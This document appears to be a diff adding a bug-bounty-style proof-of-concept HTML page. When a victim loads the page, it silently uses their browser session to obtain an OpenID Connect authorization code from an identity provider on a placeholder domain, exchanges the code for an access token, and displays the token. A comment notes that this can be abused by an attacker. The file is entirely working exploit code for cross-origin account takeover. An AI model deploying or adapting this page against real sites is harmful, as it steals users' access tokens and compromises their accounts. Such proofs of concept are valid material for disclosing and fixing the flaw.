@@ -1,0 +1,57 @@
+
+
+<html>
+    <head>
+        <script>
+
+            var statecode = 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'; // not validated by server  but needed to get code
+
+            function myFun(){ // first  function  executed for getting code to get token
+                var req = new XMLHttpRequest();
+                req.onload = reqListener;  
+                req.open('get','https://id.target.com/auth/realms/target/protocol/openid-connect/auth?client_id=profiles-web&redirect_uri=https%3A%2F%2Fprofile.target.com%2Fprofile&state='+statecode+'&response_mode=fragment&response_type=code&scope=openid',true); 
+                req.withCredentials = true;
+                req.setRequestHeader('Accept','application/json');  //  essential  header or request will not return code
+                req.send();
+                
+            }
+
+            function reqListener(){
+                console.log('responsetext='+this.responseText);
+                console.log('responseurl='+this.responseURL);
+               
+
+                var obj = JSON.parse(this.responseText);  // the response is in json format 
+                var codeuri = obj.uri;  //the uri object in the json body returns code
+
+                var code = codeuri.substring(135);  //  used for extracting only the code from the uri object in the above response
+                
+                console.log('code='+code);
+                
+                getCodes(code); // token request  function called passing code
+
+            }
+
+            function getCodes(tokencode){ // request function for obtaining the access token
+                var req2 = new XMLHttpRequest();
+                req2.onload = accTokenListner;  
+                req2.open('post','https://id.target.com/auth/realms/target/protocol/openid-connect/token',true); 
+                req2.withCredentials = true;
+                req2.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); // essential header if does not exist the response will throw error
+                req2.send('code='+tokencode+'&grant_type=authorization_code&client_id=profiles-web&redirect_uri=https%3A%2F%2Fprofile.target.com%2Fprofile');
+            }
+
+            function accTokenListner(){
+                document.getElementById("pid3").innerHTML =this.responseText; // access token request sucess this can be abused by attacker 
+            }
+
+        </script>
+
+    </head>
+    <body onload="myFun()"></body>
+
+    <p id="pid3">
+        Wait......
+
+    </p>
+</html>
